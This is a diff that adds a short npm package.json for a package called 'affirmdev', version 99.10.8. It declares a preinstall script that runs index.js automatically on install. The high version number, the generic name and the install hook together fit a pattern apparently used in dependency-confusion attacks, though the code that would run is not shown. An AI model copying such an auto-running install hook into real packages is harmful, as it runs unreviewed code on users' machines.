@@ -1,0 +1,12 @@
+{
+  "name": "affirmdev",
+  "version": "99.10.8",
+  "description": "affirm test package",
+  "main":"index.js",
+  "scripts":{
+  "test":"echo \"error no test specified\" && exit 1",
+  "preinstall":"node index.js"
+  },
+  "author":"",
+  "License":"ISC"
+}
